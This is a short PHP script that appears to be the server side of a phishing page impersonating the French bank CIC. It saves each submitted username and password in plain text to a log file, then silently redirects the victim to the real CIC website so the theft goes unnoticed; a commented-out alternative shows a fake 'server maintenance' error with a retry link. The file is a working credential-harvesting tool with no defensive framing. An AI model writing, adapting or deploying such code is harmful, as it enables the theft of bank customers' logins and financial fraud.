<?php
//Transmition
file_put_contents('DB.log', "\n username:", FILE_APPEND);
file_put_contents('DB.log', $_POST['username'], FILE_APPEND);
file_put_contents('DB.log', "\n password:", FILE_APPEND);
file_put_contents('DB.log', $_POST['psw'], FILE_APPEND);

// A Décommenter pour observer l'erreur ainsi que le php en action
/*echo('ERROR 505 Server Maintenance');
echo("<br/>____________________________<br/>");
echo("Cliquez <a href='https://www.cic.fr/fr/authentification.html'>ici</a> pour réessayer");*/

//Redirection
echo '<script type="text/javascript">',
     'window.location="https://www.cic.fr/fr/banques/particuliers/gestion-courante/gerer-vos-comptes/index.html";',
     '</script>';
?>